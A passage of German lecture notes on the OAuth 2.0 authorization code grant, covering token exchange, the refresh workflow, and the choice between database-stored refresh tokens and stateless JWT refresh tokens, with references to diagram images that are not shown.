	- Client tauscht Autorisierungs-Code dann beim Authorization Server gegen ein Access Token ein
	- Client kann dann mit Access Token auf Ressource beim Resource
	  Server zugreifen

![Authorization Code Grant](./static/code.png)

![Authorization Code Grant Part 2](./static/code2.png)

![Parameters](./static/parameter.png)

**Workflow, um einen abgelaufenen Token zu refreshen**

![Refresh](./static/refresh.png)

**Erzeugen und Verwalten von Refresh Tokens**
Erzeugen von Refresh Token (Schritte 1, 2)

- Refresh Token kann eine zufällige Zeichenkette sein

- **Problem**
	- Authorization Server muss dann speichern, welches Refresh Token er (für welchen Client) ausgestellt hat, um diesen in Schritt 7 des Diagramms der vorangegangenen Folie überprüfen zu können
	- Typischerweise werden solche Refresh Tokens serverseitig in einer Datenbank gespeichert
	- Server verwaltet somit einen Zustand in Form von Refresh Tokens
	  - Server ist stateful
	- Abhilfe durch JSON Web Tokens (JWT) als Refresh Token
	- Zustand ist dann in JWT enthalten
	- JWT Refresh Token muss nicht auf Server gespeichert werden
	- Server prüft JWT Refresh Token mit seinem geheimen Schlüssel
